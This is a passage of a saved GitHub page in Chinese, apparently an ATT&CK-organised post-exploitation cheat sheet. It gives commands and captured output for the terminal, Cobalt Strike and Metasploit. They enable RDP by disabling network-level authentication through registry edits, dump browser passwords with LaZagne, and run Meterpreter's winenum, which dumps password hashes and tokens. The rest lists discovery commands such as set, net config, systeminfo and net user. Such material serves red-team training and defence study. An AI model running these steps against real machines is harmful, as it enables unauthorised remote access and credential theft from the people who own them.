<h4><a id="user-content-cs下操作-25" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<pre><code>shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService

explore --&gt; desktop

</code></pre>
<h2><a id="user-content-credentials-in-files在文件中获取凭证" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#credentials-in-files%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Credentials in Files(在文件中获取凭证)</h2>
<h3><a id="user-content-collect-passwords-from-web-browsers在浏览器中获取密码" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#collect-passwords-from-web-browsers%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Collect passwords from web browsers（在浏览器中获取密码）</h3>
<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<p><a href="https://github.com/hassaanaliw/chromepass">https://github.com/hassaanaliw/chromepass</a></p>
<h4><a id="user-content-terminal下操作-21" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>laZagne.exe browsers [-f]</p>
</blockquote>
<pre><code>PS C:\Users\Administrator\Desktop\powrshell&gt; C:\Users\Administrator\Desktop\lazagne.exe browsers -f

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for a02f012c-b6ff-48b9-8b07-5a2ea73628d6
[+] System masterkey decrypted for 56e7df96-74cb-45af-95ed-f15706dcff3e

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.952999830246
</code></pre>
<h2><a id="user-content-system-information-discovery系统信息发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#system-information-discovery%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>System Information Discovery(系统信息发现)</h2>
<h3><a id="user-content-get-windows-versionwindows版本获取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-windows-versionwindows%E7%89%88%E6%9C%AC%E8%8E%B7%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get Windows version（windows版本获取）</h3>
<h4><a id="user-content-terminal下操作-22" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>ver</p>
</blockquote>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;ver

Microsoft Windows [版本 10.0.17763.593]

</code></pre>
<h4><a id="user-content-cs下操作-26" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell ver</p>
</blockquote>
<h3><a id="user-content-print-environment-variables环境变量输出" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#print-environment-variables%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Print environment variables(环境变量输出)</h3>
<h4><a id="user-content-terminal下操作-23" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>set</p>
</blockquote>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=DESKTOP-QQF0MLN
ComSpec=C:\Windows\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
FPS_BROWSER_USER_PROFILE_STRING=Default
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\DESKTOP-QQF0MLN
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Program Files (x86)\NetSarang\Xftp 6\;C:\Program Files (x86)\NetSarang\Xshell 6\;C:\Program Files
iles\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\Win
v1.0\;C:\python3;C:\python3\Scripts;C:\Python27;C:\Python27\Scripts;C:\python3\Scripts\;C:\python3\;C:\Us
or\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=9e0a
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShel
ndows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp
TMP=C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN=DESKTOP-QQF0MLN
USERDOMAIN_ROAMINGPROFILE=DESKTOP-QQF0MLN
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows

</code></pre>
<h4><a id="user-content-cs下操作-27" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-27"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell set</p>
</blockquote>
<h3><a id="user-content-get-computer-informationcomputer信息获取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-computer-informationcomputer%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get computer information(computer信息获取)</h3>
<h4><a id="user-content-terminal下操作-24" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net config workstation</p>
<p>net config server</p>
</blockquote>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;net config workstation
计算机名                     \\DESKTOP-QQF0MLN
计算机全名                   DESKTOP-QQF0MLN
用户名                       Administrator

工作站正运行于
        NetBT_Tcpip_{D56C33AF-9F2F-4E8B-90F2-A5FB6CAA3D90} (000C29D73FB2)

软件版本                     Windows 10 Enterprise LTSC 2019

工作站域                     WORKGROUP
登录域                       DESKTOP-QQF0MLN

COM 打开超时 (秒)            0
COM 发送计数 (字节)          16
COM 发送超时 (毫秒)          250
命令成功完成。


C:\Users\Administrator\Desktop\powrshell&gt;net config server
服务器名称                     \\DESKTOP-QQF0MLN
服务器注释

软件版本                       Windows 10 Enterprise LTSC 2019
服务器正运行于
        NetbiosSmb (DESKTOP-QQF0MLN)
        NetBT_Tcpip_{D56C33AF-9F2F-4E8B-90F2-A5FB6CAA3D90} (DESKTOP-QQF0MLN)


服务器已隐藏                   No
登录的用户数量上限             20
每个会话打开的文件数量上限     16384

空闲的会话时间 (分)            15
命令成功完成。


</code></pre>
<h4><a id="user-content-cs下操作-28" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-28"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net config workstation</p>
</blockquote>
<blockquote>
<p>shell net config server</p>
</blockquote>
<h3><a id="user-content-get-configuration-information配置信息获取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-configuration-information%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get configuration information(配置信息获取)</h3>
<h4><a id="user-content-terminal下操作-25" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]</p>
</blockquote>
<p><a target="_blank" rel="noopener noreferrer" href="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f30303746384767426c7931673672386a75636274356a33306f37306c703431342e6a7067"><img src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f30303746384767426c7931673672386a75636274356a33306f37306c703431342e6a7067" alt="截图_2019-09-07_20-39-48.png" data-canonical-src="http://ww1.sinaimg.cn/large/007F8GgBly1g6r8jucbt5j30o70lp414.jpg" style="max-width:100%;"></a></p>
<h4><a id="user-content-msf下操作-20" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>sysinfo</p>
<p>run winenum</p>
</blockquote>
<pre><code>meterpreter &gt; sysinfo 
Computer        : ROOT-5DE52AC98B
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter &gt; run winenum 
[*] Running Windows Local Enumeration Meterpreter Script
[*] New session on 192.168.2.114:1068...
[*] Saving general report to /root/.msf4/logs/scripts/winenum/ROOT-5DE52AC98B_20190907.4112/ROOT-5DE52AC98B_20190907.4112.txt
[*] Output of each individual command is saved to /root/.msf4/logs/scripts/winenum/ROOT-5DE52AC98B_20190907.4112
[*] Checking if ROOT-5DE52AC98B is a Virtual Machine ........
[*] 	This is a VMware Workstation/Fusion Virtual Machine
[*] 	UAC is Disabled
[*] Running Command List ...
[*] 	running command cmd.exe /c set
[*] 	running command ipconfig /displaydns
[*] 	running command arp -a
[*] 	running command netstat -nao
[*] 	running command netstat -vb
[*] 	running command route print
[*] 	running command netstat -ns
[*] 	running command ipconfig /all
[*] 	running command net view
[*] 	running command net accounts
[*] 	running command net view /domain
[*] 	running command net share
[*] 	running command net group
[*] 	running command net user
[*] 	running command net localgroup
[*] 	running command net localgroup administrators
[*] 	running command net group administrators
[*] 	running command netsh firewall show config
[*] 	running command tasklist /svc
[*] 	running command net session
[*] 	running command gpresult /SCOPE COMPUTER /Z
[*] 	running command gpresult /SCOPE USER /Z
[*] Running WMIC Commands ....
[*] 	running command wmic group list
[*] 	running command wmic nteventlog get path,filename,writeable
[*] 	running command wmic useraccount list
[*] 	running command wmic netclient list brief
[*] 	running command wmic share get name,path
[*] 	running command wmic volume list brief
[*] 	running command wmic logicaldisk get description,filesystem,name,size
[*] 	running command wmic service list brief
[*] 	running command wmic netlogin get name,lastlogon,badpasswordcount
[*] 	running command wmic netuse get name,username,connectiontype,localname
[*] 	running command wmic rdtoggle list
[*] 	running command wmic startup list full
[*] 	running command wmic qfe
[*] 	running command wmic product get name,version
[*] Extracting software list from registry
[*] Dumping password hashes...
[*] Hashes Dumped
[*] Getting Tokens...
[*] All tokens have been processed
[*] Done!


</code></pre>
<h4><a id="user-content-cs下操作-29" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-29"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell systeminfo</p>
</blockquote>
<h2><a id="user-content-account-discovery认证枚举" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#account-discovery%E8%AE%A4%E8%AF%81%E6%9E%9A%E4%B8%BE"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Account Discovery(认证枚举)</h2>
<h3><a id="user-content-gather-more-information-on-targeted-users收集更多的目标用户信息" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#gather-more-information-on-targeted-users%E6%94%B6%E9%9B%86%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Gather more information on targeted users（收集更多的目标用户信息）</h3>
<h4><a id="user-content-terminal下操作-26" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net user [username] [/domain]</p>
</blockquote>
